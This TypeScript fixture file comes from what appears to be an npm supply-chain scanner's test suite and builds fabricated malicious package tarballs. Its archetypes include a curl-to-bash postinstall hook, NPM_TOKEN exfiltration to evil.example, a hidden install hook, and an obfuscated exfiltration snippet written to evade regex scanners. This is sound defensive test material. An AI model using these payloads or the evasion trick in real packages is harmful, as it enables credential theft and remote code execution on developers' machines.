import { createHash } from "node:crypto";
import { mkdir, mkdtemp, readFile, rm } from "node:fs/promises";
import { writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import * as tar from "tar";

/**
 * Shared synthetic malicious-package fixtures for the CLI tests. These are
 * FABRICATED packages (never real malware) built into real gzipped npm
 * tarballs so tests exercise the true acquisition → extraction → analysis path
 * with only the network stubbed. Reused by the end-to-end command tests and the
 * pipeline/audit tests.
 */

export interface SyntheticPackage {
  name: string;
  version?: string;
  /** Extra files written under the tarball's `package/` root (POSIX paths). */
  files?: Record<string, string>;
  /** Lifecycle scripts in the tarball's package.json. */
  scripts?: Record<string, string>;
  dependencies?: Record<string, string>;
  repository?: string;
  /**
   * Packument scripts, when they must DIFFER from the tarball (the
   * compromised-mirror hidden-hook attack). Defaults to `scripts`.
   */
  packumentScripts?: Record<string, string>;
  /** ISO publish date (default: an old, established date). */
  publishedAt?: string;
}

export const sri = (bytes: Buffer): string =>
  `sha512-${createHash("sha512").update(bytes).digest("base64")}`;

/** Build a real gzipped npm tarball (`package/package.json` + files) in a temp dir. */
export async function buildPackageTarball(pkg: SyntheticPackage): Promise<Buffer> {
  const version = pkg.version ?? "1.0.0";
  const work = await mkdtemp(path.join(tmpdir(), "targate-fixture-"));
  try {
    const root = path.join(work, "package");
    await mkdir(root, { recursive: true });
    await writeFile(
      path.join(root, "package.json"),
      JSON.stringify({
        name: pkg.name,
        version,
        scripts: pkg.scripts ?? {},
        ...(pkg.dependencies ? { dependencies: pkg.dependencies } : {}),
      }),
    );
    for (const [rel, content] of Object.entries(pkg.files ?? {})) {
      const full = path.join(root, rel);
      await mkdir(path.dirname(full), { recursive: true });
      await writeFile(full, content);
    }
    const file = path.join(work, "package.tgz");
    await tar.c({ gzip: true, cwd: work, file }, ["package"]);
    return await readFile(file);
  } finally {
    await rm(work, { recursive: true, force: true });
  }
}

/**
 * A `fetch` replacement serving the fabricated registry: packument for the
 * package, its tarball bytes, and an OSV response (no vulns unless given). Wrap
 * it in `vi.fn(...)` + `vi.stubGlobal("fetch", ...)` in the test.
 */
export function registryFetchStub(
  pkg: SyntheticPackage,
  bytes: Buffer,
  options: { osvVulns?: unknown[] } = {},
): (input: string | URL) => Promise<unknown> {
  const version = pkg.version ?? "1.0.0";
  const integrity = sri(bytes);
  const published = pkg.publishedAt ?? "2019-01-01T00:00:00Z";
  const tarballUrl = `https://registry.npmjs.org/${pkg.name}/-/${pkg.name}-${version}.tgz`;
  return async (input: string | URL) => {
    const url = String(input);
    if (url.includes("api.osv.dev")) {
      return { ok: true, status: 200, json: async () => ({ vulns: options.osvVulns ?? [] }) };
    }
    if (url.endsWith(".tgz")) {
      return { ok: true, status: 200, arrayBuffer: async () => new Uint8Array(bytes).buffer };
    }
    return {
      ok: true,
      status: 200,
      json: async () => ({
        "dist-tags": { latest: version },
        versions: {
          [version]: {
            name: pkg.name,
            version,
            repository: { url: pkg.repository ?? `https://github.com/example/${pkg.name}` },
            maintainers: [{ name: "example" }],
            dist: { tarball: tarballUrl, integrity },
            scripts: pkg.packumentScripts ?? pkg.scripts ?? {},
            ...(pkg.dependencies ? { dependencies: pkg.dependencies } : {}),
          },
        },
        time: { created: "2016-01-01T00:00:00Z", [version]: published },
      }),
    };
  };
}

/**
 * Reusable malicious archetypes. Each returns a SyntheticPackage; the first
 * three are caught by the DETERMINISTIC engine, `obfuscatedExfil` is written to
 * DEFEAT the regex scanners (only the AI source audit can catch it).
 */
export const archetypes = {
  /** postinstall pipes a network download into a shell — deterministic BLOCK. */
  curlBashPostinstall: (name = "evil-curl"): SyntheticPackage => ({
    name,
    scripts: { postinstall: "curl -s https://evil.example/x | bash" },
  }),

  /** install script reads a token and ships it out — deterministic BLOCK. */
  envNetworkExfil: (name = "evil-exfil"): SyntheticPackage => ({
    name,
    scripts: { postinstall: "node steal.js" },
    files: {
      "steal.js":
        "const token = process.env.NPM_TOKEN;\nfetch('https://evil.example/collect?t=' + token);\n",
    },
  }),

  /** tarball runs an install hook the packument hides — mirror hard block. */
  hiddenInstallHook: (name = "evil-hidden"): SyntheticPackage => ({
    name,
    scripts: { postinstall: "node install.js" },
    packumentScripts: {}, // registry metadata hides the tarball's hook
    files: { "install.js": "require('child_process').exec('id');\n" },
  }),

  /**
   * Exfiltration hidden from the static scanners: `process.env` is assembled by
   * string-splitting and `fetch` is called by bracket access, so the regex
   * heuristics (`/process\.env\b/`, `/\bfetch\s*\(/`) do NOT match. Only reading
   * the code (the AI audit) reveals it.
   */
  obfuscatedExfil: (name = "evil-obfuscated"): SyntheticPackage => ({
    name,
    files: {
      "index.js": [
        "const g = globalThis;",
        "const env = g['pro' + 'cess']['e' + 'nv'];",
        "const token = env['NPM' + '_TOKEN'];",
        "const send = g['fe' + 'tch'];",
        "send(['https:', '', 'evil.example', 'c'].join('/') + '?t=' + token);",
        "module.exports = {};",
      ].join("\n"),
    },
  }),

  /** A benign package — the negative control. */
  clean: (name = "tidy-utils"): SyntheticPackage => ({
    name,
    files: { "index.js": "module.exports = (a, b) => a + b;\n" },
  }),
};
